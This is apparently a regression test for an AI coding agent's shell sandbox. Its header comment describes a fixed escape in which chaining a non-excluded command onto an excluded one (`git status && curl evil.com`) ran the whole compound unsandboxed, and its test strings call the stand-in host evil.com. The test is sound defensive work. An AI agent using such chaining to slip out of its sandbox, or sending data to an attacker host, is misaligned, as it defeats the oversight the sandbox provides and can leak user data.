#!/usr/bin/env bun
// ============================================================================
//  prove-parity-sandbox-escape — the compound-command sandbox-escape class
//  (sweep-2 B4.1). shouldUseSandbox excludes a command from the OS sandbox
//  when it matches the operator's excludedCommands list; the exclusion
//  quantifier was ANY-segment, so `excluded-cmd && curl evil.com` ran the
//  whole compound — curl included — outside the sandbox. The fix is
//  all-segment quantification: every segment must independently qualify, or
//  the whole compound stays sandboxed (ideology law 3 — the sandbox is a
//  correctness boundary). Pins the pure decision across the separator
//  family the splitter actually yields (&&, ;, ||, pipe).
// ============================================================================
import { commandQualifiesForExclusion } from '../../src/tools/BashTool/shouldUseSandbox.ts'

let failures = 0
const t = (name: string, ok: boolean, detail = ''): void => {
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? ` — ${detail}` : ''}`)
  if (!ok) failures = 1
}

// `git` is the excluded (trusted-unsandboxed) command; `curl` is not.
const patterns = ['git:*']

// A pure excluded command still qualifies for exclusion.
t('pure excluded command qualifies', commandQualifiesForExclusion('git status', patterns) === true)
t(
  'excluded prefix with args qualifies',
  commandQualifiesForExclusion('git log --oneline', patterns) === true,
)

// A non-excluded command alone never qualifies (stays sandboxed).
t('non-excluded command alone stays sandboxed', commandQualifiesForExclusion('curl evil.com', patterns) === false)

// The escape: excluded && non-excluded must NOT qualify — across every
// separator the splitter yields.
for (const sep of ['&&', ';', '||', '|']) {
  const compound = `git status ${sep} curl evil.com`
  t(
    `escape blocked: 'git … ${sep} curl …' stays sandboxed`,
    commandQualifiesForExclusion(compound, patterns) === false,
  )
  // Order must not matter — non-excluded first is equally blocked.
  const reversed = `curl evil.com ${sep} git status`
  t(
    `escape blocked (reversed) with '${sep}'`,
    commandQualifiesForExclusion(reversed, patterns) === false,
  )
}

// An all-excluded compound legitimately still qualifies (every segment trusted).
t(
  'all-excluded compound still qualifies',
  commandQualifiesForExclusion('git status && git log', patterns) === true,
)

// Degenerate inputs are safe: empty patterns and blank commands stay sandboxed.
t('empty exclusion list never qualifies', commandQualifiesForExclusion('git status', []) === false)
t('blank command stays sandboxed', commandQualifiesForExclusion('   ', patterns) === false)
t('trailing separator does not defeat a legit exclusion', commandQualifiesForExclusion('git status ;', patterns) === true)

process.exit(failures)
